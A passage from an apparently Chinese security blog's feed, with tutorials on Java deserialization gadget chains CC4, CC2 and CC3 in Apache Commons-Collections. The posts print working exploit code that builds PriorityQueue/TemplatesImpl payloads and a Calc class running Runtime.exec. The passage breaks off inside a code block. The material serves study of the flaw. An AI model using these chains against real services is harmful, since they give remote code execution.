punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 反序列化</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> targetField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h2><p><a href="https://xz.aliyun.com/t/9409#toc-4">CC链 1-7 分析</a></p><p><a href="https://www.sec-in.com/article/640">Java安全之CC4链</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 CC2 链</title>
      <link href="/2023/01/26/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc2-lian/"/>
      <url>/2023/01/26/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc2-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-CC2-链"><a href="#Java-反序列化-Commons-Collections-篇-CC2-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC2 链"></a>Java 反序列化 Commons-Collections 篇 CC2 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>CC2 链只能在 commons-collections4.0 库下使用</p><p>其利用的 TransformingComparator 在 commons-collections3 中无法反序列化</p><p>而且 InvokerTransformer 在 commons-collections4 其他版本中去掉了序列化</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li><p>jdk8u65</p></li><li><p>commons-collections4.0</p></li><li><p>Maven 3.8.7</p></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-CC2-链分析"><a href="#3-CC2-链分析" class="headerlink" title="3. CC2 链分析"></a>3. CC2 链分析</h2><p>在 CC3 的加载字节码的基础上寻找另外一种触发方法</p><p>这里引入了两个新的类 PriorityQueue 与 TransformingComparator</p><h3 id="3-1-PriorityQueue-利用"><a href="#3-1-PriorityQueue-利用" class="headerlink" title="3.1 PriorityQueue 利用"></a>3.1 PriorityQueue 利用</h3><p>优先级队列，会给每个元素定义出”优先级“，取出数据的时候会按照优先级来取。</p><p>该类支持序列化操作，查看一下 readObject 方法</p><p><img src="/../../../../../pic/image-20230126231917228.png"></p><p>依次读取对象并写入到队列中，跟进 heapify() 方法</p><p><img src="/../../../../../pic/image-20230126232341952.png"></p><p>这里需要让 size &gt;= 2 才会进入到 siftDown() 方法中，所以 <strong>需要向 PriorityQueue 中插入两个对象</strong>，继续跟进</p><p><img src="/../../../../../pic/image-20230126233311588.png"></p><p>在未传入 comparator 的情况下会调用 siftDownComparable() 创建一个 Comparable 然后调用 compareTo() 进行比较</p><p><img src="/../../../../../pic/image-20230126233513209.png"></p><p>在传入 comparator 的情况下会调用指定的 compare 进行比较</p><p><img src="/../../../../../pic/image-20230126233658074.png"></p><p>所以为了进一步利用该 comparator 应由我们传入，因此去寻找一个可利用的 compare 方法</p><h3 id="3-2-TransformingComparator-利用"><a href="#3-2-TransformingComparator-利用" class="headerlink" title="3.2 TransformingComparator 利用"></a>3.2 TransformingComparator 利用</h3><p><img src="/../../../../../pic/image-20230126234130070.png"></p><p>先使用 transform 处理然后丢给 compare 进行比较，可以在这个地方进行调用 transform</p><h2 id="4-CC2-链-EXP-编写"><a href="#4-CC2-链-EXP-编写" class="headerlink" title="4. CC2 链 EXP 编写"></a>4. CC2 链 EXP 编写</h2><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过 if 确保进入</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 写入字节码</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// transform -&gt; newTransformer</span>        <span class="token class-name">InvokerTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// priorityQueue -&gt; readObject</span>        <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改 size 值进入 siftDown</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span> <span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改 queue 传入 TemplatesImpl 类</span>        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">,</span> templates<span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 反序列化</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> targetField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1265120632401152">使用PriorityQueue</a></p><p><a href="https://xz.aliyun.com/t/9409#toc-3">CC链 1-7 分析</a></p><p><a href="https://www.cnblogs.com/byErichas/p/15749668.html">Java–cc2链反序列化漏洞&amp;超级清晰详细</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 CC3 链</title>
      <link href="/2023/01/26/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc3-lian/"/>
      <url>/2023/01/26/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc3-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-CC3-链"><a href="#Java-反序列化-Commons-Collections-篇-CC3-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC3 链"></a>Java 反序列化 Commons-Collections 篇 CC3 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>CC3 链不同的是引入了 TemplatesImpl 的类加载机制来替换 InvokerTransformer</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li>java 8u65</li><li>commons-collections 3.2.1</li><li>maven 3.8.7</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-CC3-链分析"><a href="#3-CC3-链分析" class="headerlink" title="3. CC3 链分析"></a>3. CC3 链分析</h2><h3 id="3-1-TemplatesImpl-利用"><a href="#3-1-TemplatesImpl-利用" class="headerlink" title="3.1 TemplatesImpl 利用"></a>3.1 TemplatesImpl 利用</h3><p>在 TemplatesImpl 下存在私有类 TransletClassLoader 调用了 defineClass 方法，该方法可以将字节码处理成一个实例化类</p><p><img src="/../../../../../pic/image-20230126143358869.png"></p><p>由于是私有的类没法直接调用，寻找在本类中调用的地方</p><p><img src="/../../../../../pic/image-20230126143846067.png"></p><p>TemplatesImpl.defineTransletClasses 调用了，但是依旧是个私有方法，继续寻找上级方法</p><p><img src="/../../../../../pic/image-20230126144403735.png"></p><p>其他两个方法没办法进一步利用，这里找到 TemplatesImpl.getTransletInstance() 方法，继续寻找上级</p><p><img src="/../../../../../pic/image-20230126144550438.png"></p><p>最后找到了 TemplatesImpl.newTransformer() 方法，该方法是一个公共方法，可以直接进行调用，写个简单的测试一下</p><p>先生成一个恶意类，一会用来加载</p><ul><li>Calc.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>    <span class="token comment">// 写入静态构造方法，在加载时就会调用</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里继承 AbstractTranslet 是因为在加载类之后还会检测是否继承了 AbstractTranslet，否则就会丢出报错</p><p><img src="/../../../../../pic/image-20230126150212204.png"></p><p>将类编译为字节码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">javac Calc.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编写利用 EXP</p><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span 